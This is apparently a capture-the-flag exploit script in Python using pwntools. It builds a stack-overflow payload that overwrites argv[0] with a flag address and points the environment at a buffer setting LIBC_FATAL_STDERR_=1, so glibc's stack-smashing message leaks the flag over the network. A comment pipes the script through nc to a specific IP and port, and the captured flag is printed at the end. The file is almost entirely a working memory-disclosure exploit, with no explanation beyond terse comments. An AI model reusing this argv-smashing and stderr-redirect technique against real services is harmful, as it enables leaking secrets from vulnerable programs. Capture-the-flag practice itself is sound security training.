from pwn import *

rep=0xffffd4e8 - int(sys.argv[2]) #160 <== rep: contains the second buffer that will be filled ; 160 is the result of  bruteforcing the offset decalage 
fix=0xffffd4b6 - int(sys.argv[2]) #160 <== same distance between fixed and replaced buffer
payload = ""
payload += "A"*234+p32(fix)  #overflow argv[0] with flag address
payload += "AAAA"+p32(rep) + "\n" #points env to second buffer which will contain the libc_fatal_stderr_ variable

payload += "LIBC_FATAL_STDERR_=1"+"\n"  #redirect stderr to client side 


print payload

#python exploit.py|nc 52.50.127.68 44444
#Flag{sm4ash_argv_sm4sh_env_sm4sh_ev3rything!}
